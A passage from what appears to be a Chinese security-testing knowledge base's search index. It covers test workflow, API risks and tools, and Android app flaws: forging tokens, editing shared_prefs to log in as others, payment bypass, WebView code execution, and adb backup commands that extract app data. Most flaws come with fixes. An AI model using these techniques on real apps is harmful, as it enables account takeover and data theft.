\u5b89\u5168\u963b\u788d\u4e86\u4e1a\u52a1\u7684\u53d1\u5c55\uff08\u8fd9\u662f\u5f88\u591a\u4e1a\u52a1\u7684\u76f4\u89c2\u8ba4\u4e3a\uff0c\u4e5f\u662f\u5b89\u5168\u5de5\u4f5c\u4e0d\u5230\u4f4d\u7684\u4f53\u73b0\uff09\uff0c\u5982\uff1a\u5b89\u5168\u6d4b\u8bd5\u6240\u9700\u65f6\u95f4\u3001\u5b89\u5168\u6d4b\u8bd5\u53d1\u73b0\u7684\u95ee\u9898\u9700\u8981\u4fee\u590d\u7b49\u7b49\u8fd9\u4e9b\u90fd\u963b\u788d\u4e86\u7cfb\u7edf\u7684\u9884\u671f\u4e0a\u7ebf\u65f6\u95f4\uff1b \u5f53\u7136\u4e00\u4e2a\u597d\u7684\u5b89\u5168\u6d4b\u8bd5\u6d41\u7a0b\u9700\u8981\uff1a\u4e0d\u65ad\u7684\u6c9f\u901a\u534f\u8c03\uff0c\u4e00\u4e2a\u5b8c\u5584\u7cfb\u7edf\u5982\uff1a\u90ae\u4ef6(\u6ca1\u6709IT\u7cfb\u7edf\u7684\u60c5\u51b5\u4e0b)\u3001JIRA\u3001\u7985\u9053\u7b49\u3002 \u4e00\u822c\u800c\u8a00\uff0c\u5b89\u5168\u6d4b\u8bd52\u79cd\u60c5\u51b5\uff0c\u8fd9\u91cc\u9ed8\u8ba4\u5ffd\u7565\uff1a\u6ca1\u6709\u6d41\u7a0b\uff0c\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u76f4\u63a5\u786c\u6760\u7684\u60c5\u51b5\u3002","title":"\u5b89\u5168\u6d4b\u8bd5\u6d41\u7a0b"},{"location":"application-security/security-testing/#_5","text":"","title":"\u4e3b\u52a8\u578b\u5b89\u5168\u6d4b\u8bd5\u6d41\u7a0b"},{"location":"application-security/security-testing/#_6","text":"\u4e24\u79cd\u6d41\u7a0b\u4e3b\u8981\u662f\u63d0\u51fa\u9700\u6c42\u7684\u4eba\u5458\u89d2\u8272\u4e0d\u4e00\u81f4\uff0c\u5728\u63d0\u51fa\u7684\u9700\u6c42\u4e2d\uff0c\u9700\u8981\u660e\u786e\u5982\u4e0b\u7684\u4e1c\u897f\uff1a # \u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u63d0\u51fa\u9700\u6c42\u5ba1\u6279 1.\u9700\u8981\u6d4b\u8bd5\u7684\u5bf9\u8c61\uff1a\u5730\u5740\u3001\u662f\u5426\u9700\u8981\u4e1a\u52a1\u65b9\u914d\u5408\uff08\u5ba1\u6838\u6ce8\u518c\u7528\u6237\u7b49\uff09\u3001\u662f\u5426\u9700\u8981\u63d0\u4f9b\u6d4b\u8bd5\u8d26\u53f7\u5bc6\u7801\u7b49\u4fe1\u606f\uff1b 2.\u6d4b\u8bd5\u6240\u9700\u7684\u65f6\u95f4\uff1a 3.\u6d4b\u8bd5\u53ef\u80fd\u9020\u6210\u7684\u5f71\u54cd\uff1a 4.\u5b89\u5168\u6d4b\u8bd5\u7528\u4f8b\uff1a\u5982\u679c\u53ef\u80fd\u63d0\u4f9b\u4e00\u4efd\u5b89\u5168\u6d4b\u8bd5\u7528\u4f8b\u8fd9\u6837\u53ef\u4ee5\u8ba9\u4e1a\u52a1\u65b9\u77e5\u6653\u5b89\u5168\u4f1a\u8fdb\u884c\u54ea\u4e9b\u653b\u51fb\uff1b # \u4e1a\u52a1\u65b9\u63d0\u51fa\u5b89\u5168\u6d4b\u8bd5\u9700\u6c42 1.\u9700\u8981\u6d4b\u8bd5\u7684\u5bf9\u8c61\uff1a\u4e00\u822c\u6211\u9047\u5230\u90fd\u662f\u63a5\u53e3\u6d4b\u8bd5\uff0c\u5c31\u9700\u8981\u63d0\u4f9b\u63a5\u53e3\u6587\u6863\uff1b 2.\u7cfb\u7edf\u4e0a\u7ebf\u65f6\u95f4\uff1a\u5b89\u5168\u6d4b\u8bd5\u9700\u8981\u6839\u636e\u4e0a\u7ebf\u65f6\u95f4\u6765\u5b89\u6392\u6d4b\u8bd5\u65f6\u95f4\uff0c\u4fdd\u969c\u65f6\u95f4\u7684\u5145\u88d5\uff1b","title":"\u88ab\u52a8\u578b\u5b89\u5168\u6d4b\u8bd5\u6d41\u7a0b"},{"location":"application-security/security-testing/#_7","text":"\u5b89\u5168\u6d4b\u8bd5\u6574\u4f53\u800c\u8a00\u5206\u4e3a\u4e24\u7c7b\uff1a\u5185\u90e8\u5b89\u5168\u56e2\u961f\u3001\u5916\u90e8\u7b2c\u4e09\u65b9\uff08\u5305\u62ec\u4f17\u6d4b\uff09","title":"\u5b89\u5168\u6d4b\u8bd5\u5468\u671f"},{"location":"application-security/security-testing/#_8","text":"\u5b9a\u671f\u8fdb\u884c\u5b89\u5168\u6d4b\u8bd5\uff1a\u7ebf\u4e0a\u7cfb\u7edf\u5168\u91cf\u8986\u76d6\u6d4b\u8bd5\uff1b \u4e1a\u52a1\u53d8\u66f4\u5b89\u5168\u6d4b\u8bd5\uff1a\u65b0\u4e1a\u52a1\u3001\u65b0\u7cfb\u7edf\u3001\u4e1a\u52a1\u53d8\u66f4\u7b49\u4e0a\u7ebf\u524d\u7684\u5b89\u5168\u6d4b\u8bd5\uff0c\u8981\u6c42\u5feb\u901f\u4ea4\u4ed8\uff0c\u4fa7\u91cd\u4e8e\u9ad8\u5371\u3001\u4e25\u91cd\u6f0f\u6d1e\u7684\u6d4b\u8bd5\uff1b","title":"\u5185\u90e8\u5b89\u5168\u6d4b\u8bd5"},{"location":"application-security/security-testing/#_9","text":"\u91c7\u8d2d\u7b2c\u4e09\u65b9\u5b89\u5168\u670d\u52a1\u6216\u8005\u53c2\u4e0e\u4f17\u6d4b\uff0c\u5177\u4f53\u7684\u65f6\u95f4\u5468\u671f\u9700\u8981\u6839\u636e\u516c\u53f8\u5728\u5b89\u5168\u6d4b\u8bd5\u4e0a\u6240\u6295\u5165\u7684\u8d44\u91d1\u4ee5\u53ca\u5185\u90e8\u5b89\u5168\u56e2\u961f\u60c5\u51b5\u6765\u5408\u7406\u5b89\u6392\u3002\uff08\u6ce8\u610f\u9488\u5bf9\u4e92\u8054\u7f51\u4f01\u4e1a\uff09 \u6ca1\u6709\u5185\u90e8\u5b89\u5168\u56e2\u961f\uff1a\u4e00\u4e2a\u5b63\u5ea6\uff0c\u6216\u8005\u6700\u591a\u534a\u5e74\u5e94\u8be5\u8fdb\u884c\u4e00\u6b21\u5916\u90e8\u7b2c\u4e09\u65b9\u5b89\u5168\u6d4b\u8bd5\uff1b \u6709\u5185\u90e8\u5b89\u5168\u56e2\u961f(\u4eba\u6570\u8f83\u5c11)\uff1a\u534a\u5e74\u6216\u8005\u4e00\u5e74\uff1b \u6210\u719f\u7684\u5185\u90e8\u5b89\u5168\u56e2\u961f\uff1a\u4e00\u5e74\uff0c\u5982\u679c\u5bf9\u56e2\u961f\u6709\u4fe1\u5fc3\uff0c\u5728\u6ca1\u6709\u5408\u89c4\u7b49\u4fdd\u8981\u6c42\u4e0b\u53ef\u4ee5\u4e0d\u505a\uff1b","title":"\u5916\u90e8\u5b89\u5168\u6d4b\u8bd5"},{"location":"application-security/security-testing/#_10","text":"\u5bf9\u7cfb\u7edf\u9020\u6210\u4e0d\u53ef\u7528\u5f71\u54cd\uff1b\u5982\uff1a\u5bf9server\u7684\u6ea2\u51fa\u64cd\u4f5c\uff0c\u9ad8\u9891\u7387\u722c\u866b\uff1b \u8fdb\u884c\u4e00\u4e9b\u53ef\u80fd\u9020\u6210\u6570\u636e\u4e22\u5931\u6216\u4ea7\u751f\u810f\u6570\u636e\u7684\u6d4b\u8bd5\u5c3d\u53ef\u80fd\u5728\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\uff0c\u6d4b\u8bd5\u73af\u5883\u9700\u8981\u505a\u597d\u5907\u4efd\u65b9\u4fbf\u56de\u6eda\uff1b\u6bd4\u5982\uff1a\u626b\u63cf\u8fc7\u6ee4POST\u8bf7\u6c42\u3002 \u5982\u679c\u6709\u5b89\u5168\u9632\u62a4\u7cfb\u7edf\uff0c\u6d4b\u8bd5\u671f\u95f4\u5c3d\u53ef\u80fd\u5bf9\u5b89\u5168\u6d4b\u8bd5\u8005\u7684IP\u8fdb\u884c\u52a0\u767d\uff0c\u5c0f\u5fc3\u529e\u516c\u7f51\u6d4b\u8bd5\u62c9\u9ed1\u6574\u4e2a\u529e\u516c\u5ba4\u7684\u4eba\u3002 \u6d4b\u8bd5\u4e8b\u540e\u5904\u7406\uff1a\u5b89\u5168\u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\u9020\u6210\u7684\u6d4b\u8bd5\u6570\u636e\u5220\u9664\uff0c\u4ee5\u53ca\u9a8c\u8bc1\u95ee\u9898\u5b58\u5728\u7684\u540e\u95e8\u5220\u9664\uff1b","title":"\u5b89\u5168\u6d4b\u8bd5\u7684\u6ce8\u610f\u4e8b\u9879"},{"location":"application-security/security-testing/#_11","text":"\u5b89\u5168\u6d4b\u8bd5\u548c\u6e17\u900f\u6d4b\u8bd5\u533a\u522b \u643a\u7a0b\u5b89\u5168\u81ea\u52a8\u5316\u6d4b\u8bd5\u4e4b\u8def","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/security-testing/api-security-testing/","text":"API\u5b89\u5168\u6d4b\u8bd5 API\u5b89\u5168\u98ce\u9669 \u975e\u6cd5\u4fe1\u606f\u7a83\u53d6 HTTP/HTTPS\u55c5\u63a2\u3001\u4f1a\u8bdd\u52ab\u6301 \u5ba2\u6237\u7aef\u8bc1\u4e66\u6709\u6548\u6027 API\u5e38\u89c4\u6f0f\u6d1e XSS\u3001CSRF\u3001XXE JSON\u52ab\u6301 API\u4e1a\u52a1\u6f0f\u6d1e \u53c2\u6570\u7be1\u6539 \u91cd\u653e\u653b\u51fb \u6743\u9650\u9650\u5236\u9519\u8bef\uff1a\u8d8a\u6743\u8bbf\u95ee API\u8bbf\u95ee\u9891\u7387\u9650\u5236\u9519\u8bef API DoS\uff1a\u9488\u5bf9API\u63a5\u53e3\u7684DoS\u653b\u51fb\uff0c\u5982\uff1a\u70b8\u5f39\u653b\u51fb\u3001\u6279\u91cf\u6ce8\u518c HTTP\u5934\u90e8\u8bbe\u65bd\u4e0d\u5f53 API\u5b89\u5168\u6d4b\u8bd5\u5de5\u5177 Postman Fuzzapi Astra \uff1aAPI\u81ea\u52a8\u5316\u5b89\u5168\u6d4b\u8bd5\u5de5\u5177 Google\u63d2\u4ef6\uff1aRestlet Client\u3001APIDebug Firefox\u63d2\u4ef6\uff1aRESTClient burpsuite","title":"API\u5b89\u5168\u6d4b\u8bd5"},{"location":"application-security/security-testing/api-security-testing/#api","text":"","title":"API\u5b89\u5168\u6d4b\u8bd5"},{"location":"application-security/security-testing/api-security-testing/#api_1","text":"","title":"API\u5b89\u5168\u98ce\u9669"},{"location":"application-security/security-testing/api-security-testing/#_1","text":"HTTP/HTTPS\u55c5\u63a2\u3001\u4f1a\u8bdd\u52ab\u6301 \u5ba2\u6237\u7aef\u8bc1\u4e66\u6709\u6548\u6027","title":"\u975e\u6cd5\u4fe1\u606f\u7a83\u53d6"},{"location":"application-security/security-testing/api-security-testing/#api_2","text":"XSS\u3001CSRF\u3001XXE JSON\u52ab\u6301","title":"API\u5e38\u89c4\u6f0f\u6d1e"},{"location":"application-security/security-testing/api-security-testing/#api_3","text":"\u53c2\u6570\u7be1\u6539 \u91cd\u653e\u653b\u51fb \u6743\u9650\u9650\u5236\u9519\u8bef\uff1a\u8d8a\u6743\u8bbf\u95ee","title":"API\u4e1a\u52a1\u6f0f\u6d1e"},{"location":"application-security/security-testing/api-security-testing/#api_4","text":"API DoS\uff1a\u9488\u5bf9API\u63a5\u53e3\u7684DoS\u653b\u51fb\uff0c\u5982\uff1a\u70b8\u5f39\u653b\u51fb\u3001\u6279\u91cf\u6ce8\u518c","title":"API\u8bbf\u95ee\u9891\u7387\u9650\u5236\u9519\u8bef"},{"location":"application-security/security-testing/api-security-testing/#http","text":"","title":"HTTP\u5934\u90e8\u8bbe\u65bd\u4e0d\u5f53"},{"location":"application-security/security-testing/api-security-testing/#api_5","text":"Postman Fuzzapi Astra \uff1aAPI\u81ea\u52a8\u5316\u5b89\u5168\u6d4b\u8bd5\u5de5\u5177 Google\u63d2\u4ef6\uff1aRestlet Client\u3001APIDebug Firefox\u63d2\u4ef6\uff1aRESTClient burpsuite","title":"API\u5b89\u5168\u6d4b\u8bd5\u5de5\u5177"},{"location":"application-security/security-testing/app-security-testing/","text":"APP\u5b89\u5168\u6d4b\u8bd5 \u5173\u4e8eAPP\u7684\u5b89\u5168\u6d4b\u8bd5\u4e0eWeb\u5b89\u5168\u6d4b\u8bd5\u5f88\u7c7b\u4f3c\uff0c\u5206\u4e3a\u4ee3\u7801\u5c42\u9762\u4e0e\u5e94\u7528\u5c42\u9762\uff1a \u4ee3\u7801\u5c42\u9762\uff1a\u4ee3\u7801\u6df7\u6dc6\u3001\u53cd\u8c03\u8bd5\u3001\u53cd\u6a21\u62df\u5668\uff1b \u5e94\u7528\u5c42\u9762\uff1a\u4e0eWeb\u5b89\u5168\u6d4b\u8bd5\u4e00\u81f4\uff0c\u6d89\u53casign\u9700\u8981\u9006\u5411\u7b97\u6cd5\uff1b\u6d89\u53cahttps\u9700\u8981\u4f7f\u7528xposed\u3001frida\u6216\u8005SSL Kill switch2\u8fdb\u884c\u7ed5\u8fc7\uff1b \u5e38\u89c1\u7684APP\u6f0f\u6d1e \u4efb\u610f\u7528\u6237\u767b\u5f55 token\u751f\u6210\u7b97\u6cd5\u53ef\u9006\uff08token\u751f\u6210\u7b97\u6cd5\u5728\u672c\u5730\uff0c\u4e14app\u672a\u52a0\u56fa\u5bfc\u81f4\u53ef\u4ee5\u53cd\u7f16\u8bd1\u76f4\u63a5\u751f\u6210\u4efb\u610ftoken\uff09\uff1b \u5728shared_prefs\u76ee\u5f55\u4e2d\uff0c\u5b58\u5728\u4e00\u4e2a\u7528\u6237\u767b\u5f55\u4fe1\u606f\u6587\u4ef6\uff0c\u91cc\u9762\u6709\u7528\u6237\u540d\u5bc6\u7801\uff0c\u6211\u4eec\u628a\u7528\u6237\u540d\u4fee\u6539\u4e3a\u4e00\u4e2a\u5176\u4ed6\u7684\u5df2\u77e5\u5b58\u5728\u7684\u7528\u6237\u540d\uff0c\u5bc6\u7801\u4efb\u610f\u3002\u91cd\u65b0\u6253\u5f00app\uff0c\u53d1\u73b0\u7528\u6237\u767b\u5f55\u6210\u529f\uff1b Android App AllowBackup application android:allowBackup= true # \u5907\u4efd\u8bed\u53e5 adb backup -nosystem -noshared -apk -f com.*.ab(\u5907\u4efd\u540d\u5b57) com.package(\u4f60\u8981\u5907\u4efd\u7684\u5305) # \u6062\u590d\u8bed\u53e5 adb restore com.*.ab \u65e5\u5fd7\u5b89\u5168 \u65e5\u5fd7\u6cc4\u6f0f\u8d26\u53f7\u5bc6\u7801\uff1b \u65e5\u5fd7\u6cc4\u6f0fhttp\u8bf7\u6c42\uff08\u6709\u7684\u65f6\u5019\u53ef\u4ee5\u7528\u6b64\u65b9\u6cd5\u6765\u7ed5\u8fc7https\u4e0d\u80fd\u6293\u5305\u7684\u95ee\u9898\uff09\uff1b \u652f\u4ed8\u7ed5\u8fc7 \u901a\u8fc7\u9006\u5411\uff0c\u7ed5\u8fc7\u652f\u4ed8\uff1b \u4e00\u4e2a\u65b0\u624b\u7684\u9006\u5411\u4e4b\u8def\uff0c\u8bb0\u5f55\u4e0b\u6211\u641e\u4e0b \u4fe1\u606f\u6cc4\u6f0f apk\u6e90\u7801\u4e2d\u5b58\u653e\u90ae\u7bb1\u8d26\u53f7\u5bc6\u7801\u3001\u5185\u7f51\u5730\u5740\u3001\u63a5\u53e3\u4fe1\u606f\u7b49\uff1b \u672c\u5730\u6570\u636e\u5e93\u4e2d\u5b58\u653e\u7528\u6237\u4fe1\u606f\uff1b \u65e5\u5fd7\u4e2d\u663e\u793a\u767b\u5f55\u4fe1\u606f\uff1b \u6743\u9650\u95ee\u9898 \u6b63\u5e38\u7684\uff1a\u6587\u4ef6\u6743\u9650rw-rw----\uff0c\u76ee\u5f55\u6743\u9650rwxrwx--- APP\u6f0f\u6d1e\u5371\u5bb3 \u7ec4\u4ef6\u6cc4\u6f0f \u6f0f\u6d1e\uff1a \u7ec4\u4ef6\u5728\u88ab\u8c03\u7528\u65f6\u672a\u505a\u9a8c\u8bc1\uff1b \u5728\u8c03\u7528\u5176\u4ed6\u7ec4\u4ef6\u65f6\u672a\u505a\u9a8c\u8bc1\uff1b \u5229\u7528\uff1a \u8c03\u7528\u66b4\u9732\u7684\u7ec4\u4ef6\uff0c\u8fbe\u5230\u67d0\u79cd\u6548\u679c\uff0c\u83b7\u53d6\u67d0\u4e9b\u4fe1\u606f\uff0c\u6784\u9020\u67d0\u4e9b\u6570\u636e\u3002\uff08\u6bd4\u5982\uff1a\u8c03\u7528\u66b4\u9732\u7684\u7ec4\u4ef6\u53d1\u77ed\u4fe1\u3001\u5fae\u535a\u7b49\uff09\uff1b \u76d1\u542c\u66b4\u9732\u7ec4\u4ef6\uff0c\u8bfb\u53d6\u6570\u636e\uff1b \u5efa\u8bae\uff1a \u9a8c\u8bc1\u8f93\u5165\u4fe1\u606f\u3001\u9a8c\u8bc1\u7ec4\u4ef6\u8c03\u7528\u7b49\u3002android:exported\u8bbe\u7f6e\u4e3a false\uff1b \u4f7f\u7528 android:protectionLevel= signature \u9a8c\u8bc1\u8c03\u7528\u6765\u6e90\uff1b \u53cd\u7f16\u8bd1 \u6f0f\u6d1e\uff1aAPK\u5305\u975e\u5e38\u5bb9\u6613\u88ab\u53cd\u7f16\u8bd1\u6210\u53ef\u8bfb\u6587\u4ef6\uff0c\u7a0d\u52a0\u4fee\u6539\u5c31\u80fd\u91cd\u65b0\u6253\u5305\u6210\u65b0\u7684APK; \u5229\u7528\uff1a\u8f6f\u4ef6\u7834\u89e3\uff0c\u5185\u8d2d\u7834\u89e3\uff0c\u8f6f\u4ef6\u903b\u8f91\u4fee\u6539\uff0c\u63d2\u5165\u6076\u610f\u4ee3\u7801\uff0c\u66ff\u6362\u5e7f\u544a\u5546ID; \u5efa\u8bae\uff1a\u4f7f\u7528ProGuard\u7b49\u5de5\u5177\u6df7\u6dc6\u4ee3\u7801\uff0c\u91cd\u8981\u903b\u8f91\u7528NDK\u5b9e\u73b0\u3002 \u4f8b\u5b50\uff1a\u53cd\u7f16\u8bd1\u91cd\u6253\u5305FlappyBird\uff0c\u628a\u5e7f\u544a\u5546ID\u6362\u4e86\uff0c\u6e38\u620f\u6539\u52a0\u63d2\u4e00\u6bb5\u6076\u610f\u4ee3\u7801\u7b49\u7b49\u3002 \u6570\u636e\u7684\u5b58\u50a8\u4e0e\u4f20\u8f93 \u6f0f\u6d1e\uff1a\u5916\u90e8\u5b58\u50a8\uff08SD\u5361\uff09\u4e0a\u7684\u6587\u4ef6\u6ca1\u6709\u6743\u9650\u7ba1\u7406\uff0c\u6240\u6709\u5e94\u7528\u90fd\u53ef\u8bfb\u53ef\u5199\u3002\u5f00\u53d1\u8005\u628a\u654f\u611f\u4fe1\u606f\u660e\u6587\u5b58\u5728SD\u5361\u4e0a\uff0c\u6216\u8005\u52a8\u6001\u52a0\u8f7d\u7684payload\u653e\u5728SD\u5361\u4e0a\u3002 \u5229\u7528\uff1a\u7a83\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u7be1\u6539\u914d\u7f6e\u6587\u4ef6\uff0c\u4fee\u6539payload\u903b\u8f91\u5e76\u91cd\u6253\u5305\uff1b \u5efa\u8bae\uff1a\u4e0d\u8981\u628a\u654f\u611f\u4fe1\u606f\u653e\u5728\u5916\u90e8\u5b58\u50a8\u4e0a\u9762\uff1b\u5728\u52a8\u6001\u52a0\u8f7d\u5916\u90e8\u8d44\u6e90\u7684\u65f6\u5019\u9a8c\u8bc1\u6587\u4ef6\u5b8c\u6574\u6027\uff1b \u6f0f\u6d1e\uff1a\u4f7f\u7528\u5168\u5c40\u53ef\u8bfb\u5199\uff08MODE_WORLD_READABLE\uff0cMODE_WORLD_WRITEABLE\uff09\u7684\u5185\u90e8\u5b58\u50a8\u65b9\u5f0f\uff0c\u6216\u660e\u6587\u5b58\u50a8\u654f\u611f\u4fe1\u606f\uff08\u7528\u6237\u8d26\u53f7\u5bc6\u7801\u7b49\uff09\uff1b \u5229\u7528\uff1a\u5168\u5c40\u8bfb\u5199\u654f\u611f\u4fe1\u606f\uff0c\u6216 root \u540e\u8bfb\u53d6\u660e\u6587\u4fe1\u606f\uff1b \u5efa\u8bae\uff1a\u4e0d\u9002\u7528\u5168\u5c40\u53ef\u8bfb\u5199\u7684\u5185\u90e8\u5b58\u50a8\u65b9\u5f0f\uff0c\u4e0d\u660e\u6587\u5b58\u50a8\u7528\u6237\u8d26\u53f7\u5bc6\u7801\uff1b \u5bc6\u7801\u6cc4\u6f0f \u6f0f\u6d1e\uff1a\u5bc6\u7801\u660e\u6587\u5b58\u50a8\uff0c\u4f20\u8f93\uff1b \u5229\u7528\uff1a root \u540e\u53ef\u8bfb\u5199\u5185\u90e8\u5b58\u50a8\uff1b SD \u5361\u5168\u5c40\u53ef\u8bfb\u5199\uff1b \u516c\u5171 WiFi \u6293\u5305\u83b7\u53d6\u8d26\u53f7\u5bc6\u7801\uff1b \u5efa\u8bae\uff1a\u5b9e\u7528\u6210\u719f\u7684\u52a0\u5bc6\u65b9\u6848\u3002\u4e0d\u8981\u628a\u5bc6\u7801\u660e\u6587\u5b58\u50a8\u5728SD\u5361\u4e0a\uff1b WebView \u6f0f\u6d1e\uff1a \u6076\u610fAPP\u53ef\u4ee5\u6ce8\u5165JavaScript\u4ee3\u7801\u8fdb\u5165WebView\u4e2d\u7684\u7f51\u9875\uff0c\u7f51\u9875\u672a\u4f5c\u9a8c\u8bc1\uff1b \u6076\u610f\u7f51\u9875\u53ef\u4ee5\u6267\u884cJavaScript\u53cd\u8fc7\u6765\u8c03\u7528App\u4e2d\u6ce8\u518c\u8fc7\u7684\u65b9\u6cd5\uff0c\u6216\u8005\u4f7f\u7528\u8d44\u6e90\uff1b \u5229\u7528\uff1a \u6076\u610f\u7a0b\u5e8f\u5d4c\u5165Web APP\uff0c\u7136\u540e\u7a83\u53d6\u7528\u6237\u4fe1\u606f\uff1b \u6076\u610f\u7f51\u9875\u8fdc\u7a0b\u8c03\u7528APP\u4ee3\u7801\u3002\u66f4\u6709\u751a\u8005\uff0c\u901a\u8fc7Java Reflection\u8c03\u7528Runtime\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u5efa\u8bae\uff1a\u4e0d\u4f7f\u7528 WebView \u4e2d\u7684 setJavaScriptEnabled(true)\uff0c\u6216\u8005\u4f7f\u7528\u65f6\u5bf9\u8f93\u5165\u8fdb\u884c\u9a8c\u8bc1\u3002 \u5176\u5b83\u6f0f\u6d1e ROOT\u540e\u7684\u624b\u673a\u53ef\u4ee5\u4fee\u6539APP\u7684\u5185\u8d2d\uff0c\u6216\u8005\u5b89\u88c5\u5916\u6302APP\u7b49\uff1b Logcat\u6cc4\u9732\u7528\u6237\u654f\u611f\u4fe1\u606f\uff1b \u6076\u610f\u7684\u5e7f\u544a\u5305\uff1b \u5229\u7528 next Intent\uff1b","title":"APP\u5b89\u5168\u6d4b\u8bd5"},{"location":"application-security/security-testing/app-security-testing/#app","text":"\u5173\u4e8eAPP\u7684\u5b89\u5168\u6d4b\u8bd5\u4e0eWeb\u5b89\u5168\u6d4b\u8bd5\u5f88\u7c7b\u4f3c\uff0c\u5206\u4e3a\u4ee3\u7801\u5c42\u9762\u4e0e\u5e94\u7528\u5c42\u9762\uff1a \u4ee3\u7801\u5c42\u9762\uff1a\u4ee3\u7801\u6df7\u6dc6\u3001\u53cd\u8c03\u8bd5\u3001\u53cd\u6a21\u62df\u5668\uff1b \u5e94\u7528\u5c42\u9762\uff1a\u4e0eWeb\u5b89\u5168\u6d4b\u8bd5\u4e00\u81f4\uff0c\u6d89\u53casign\u9700\u8981\u9006\u5411\u7b97\u6cd5\uff1b\u6d89\u53cahttps\u9700\u8981\u4f7f\u7528xposed\u3001frida\u6216\u8005SSL Kill switch2\u8fdb\u884c\u7ed5\u8fc7\uff1b","title":"APP\u5b89\u5168\u6d4b\u8bd5"},{"location":"application-security/security-testing/app-security-testing/#app_1","text":"","title":"\u5e38\u89c1\u7684APP\u6f0f\u6d1e"},{"location":"application-security/security-testing/app-security-testing/#_1","text":"token\u751f\u6210\u7b97\u6cd5\u53ef\u9006\uff08token\u751f\u6210\u7b97\u6cd5\u5728\u672c\u5730\uff0c\u4e14app\u672a\u52a0\u56fa\u5bfc\u81f4\u53ef\u4ee5\u53cd\u7f16\u8bd1\u76f4\u63a5\u751f\u6210\u4efb\u610ftoken\uff09\uff1b \u5728shared_prefs\u76ee\u5f55\u4e2d\uff0c\u5b58\u5728\u4e00\u4e2a\u7528\u6237\u767b\u5f55\u4fe1\u606f\u6587\u4ef6\uff0c\u91cc\u9762\u6709\u7528\u6237\u540d\u5bc6\u7801\uff0c\u6211\u4eec\u628a\u7528\u6237\u540d\u4fee\u6539\u4e3a\u4e00\u4e2a\u5176\u4ed6\u7684\u5df2\u77e5\u5b58\u5728\u7684\u7528\u6237\u540d\uff0c\u5bc6\u7801\u4efb\u610f\u3002\u91cd\u65b0\u6253\u5f00app\uff0c\u53d1\u73b0\u7528\u6237\u767b\u5f55\u6210\u529f\uff1b","title":"\u4efb\u610f\u7528\u6237\u767b\u5f55"},{"location":"application-security/security-testing/app-security-testing/#android-app-allowbackup","text":"application android:allowBackup= true # \u5907\u4efd\u8bed\u53e5 adb backup -nosystem -noshared -apk -f com.*.ab(\u5907\u4efd\u540d\u5b57) com.package(\u4f60\u8981\u5907\u4efd\u7684\u5305) # \u6062\u590d\u8bed\u53e5 adb restore com.*.ab","title":"Android App AllowBackup"},{"location":"application-security/security-testing/app-security-testing/#_2","text":"\u65e5\u5fd7\u6cc4\u6f0f\u8d26\u53f7\u5bc6\u7801\uff1b \u65e5\u5fd7\u6cc4\u6f0fhttp\u8bf7\u6c42\uff08\u6709\u7684\u65f6\u5019\u53ef\u4ee5\u7528\u6b64\u65b9\u6cd5\u6765\u7ed5\u8fc7https\u4e0d\u80fd\u6293\u5305\u7684\u95ee\u9898\uff09\uff1b","title":"\u65e5\u5fd7\u5b89\u5168"},{"location":"application-security/security-testing/app-security-testing/#_3","text":"\u901a\u8fc7\u9006\u5411\uff0c\u7ed5\u8fc7\u652f\u4ed8\uff1b \u4e00\u4e2a\u65b0\u624b\u7684\u9006\u5411\u4e4b\u8def\uff0c\u8bb0\u5f55\u4e0b\u6211\u641e\u4e0b","title":"\u652f\u4ed8\u7ed5\u8fc7"},{"location":"application-security/security-testing/app-security-testing/#_4","text":"apk\u6e90\u7801\u4e2d\u5b58\u653e\u90ae\u7bb1\u8d26\u53f7\u5bc6\u7801\u3001\u5185\u7f51\u5730\u5740\u3001\u63a5\u53e3\u4fe1\u606f\u7b49\uff1b \u672c\u5730\u6570\u636e\u5e93\u4e2d\u5b58\u653e\u7528\u6237\u4fe1\u606f\uff1b \u65e5\u5fd7\u4e2d\u663e\u793a\u767b\u5f55\u4fe1\u606f\uff1b","title":"\u4fe1\u606f\u6cc4\u6f0f"},{"location":"application-security/security-testing/app-security-testing/#_5","text":"\u6b63\u5e38\u7684\uff1a\u6587\u4ef6\u6743\u9650rw-rw----\uff0c\u76ee\u5f55\u6743\u9650rwxrwx---","title":"\u6743\u9650\u95ee\u9898"},{"location":"application-security/security-testing/app-security-testing/#app_2","text":"","title":"APP\u6f0f\u6d1e\u5371\u5bb3"},{"location":"application-security/security-testing/app-security-testing/#_6","text":"\u6f0f\u6d1e\uff1a \u7ec4\u4ef6\u5728\u88ab\u8c03\u7528\u65f6\u672a\u505a\u9a8c\u8bc1\uff1b \u5728\u8c03\u7528\u5176\u4ed6\u7ec4\u4ef6\u65f6\u672a\u505a\u9a8c\u8bc1\uff1b \u5229\u7528\uff1a \u8c03\u7528\u66b4\u9732\u7684\u7ec4\u4ef6\uff0c\u8fbe\u5230\u67d0\u79cd\u6548\u679c\uff0c\u83b7\u53d6\u67d0\u4e9b\u4fe1\u606f\uff0c\u6784\u9020\u67d0\u4e9b\u6570\u636e\u3002\uff08\u6bd4\u5982\uff1a\u8c03\u7528\u66b4\u9732\u7684\u7ec4\u4ef6\u53d1\u77ed\u4fe1\u3001\u5fae\u535a\u7b49\uff09\uff1b \u76d1\u542c\u66b4\u9732\u7ec4\u4ef6\uff0c\u8bfb\u53d6\u6570\u636e\uff1b \u5efa\u8bae\uff1a \u9a8c\u8bc1\u8f93\u5165\u4fe1\u606f\u3001\u9a8c\u8bc1\u7ec4\u4ef6\u8c03\u7528\u7b49\u3002android:exported\u8bbe\u7f6e\u4e3a false\uff1b \u4f7f\u7528 android:protectionLevel= signature \u9a8c\u8bc1\u8c03\u7528\u6765\u6e90\uff1b","title":"\u7ec4\u4ef6\u6cc4\u6f0f"},{"location":"application-security/security-testing/app-security-testing/#_7","text":"\u6f0f\u6d1e\uff1aAPK\u5305\u975e\u5e38\u5bb9\u6613\u88ab\u53cd\u7f16\u8bd1\u6210\u53ef\u8bfb\u6587\u4ef6\uff0c\u7a0d\u52a0\u4fee\u6539\u5c31\u80fd\u91cd\u65b0\u6253\u5305\u6210\u65b0\u7684APK; \u5229\u7528\uff1a\u8f6f\u4ef6\u7834\u89e3\uff0c\u5185\u8d2d\u7834\u89e3\uff0c\u8f6f\u4ef6\u903b\u8f91\u4fee\u6539\uff0c\u63d2\u5165\u6076\u610f\u4ee3\u7801\uff0c\u66ff\u6362\u5e7f\u544a\u5546ID; 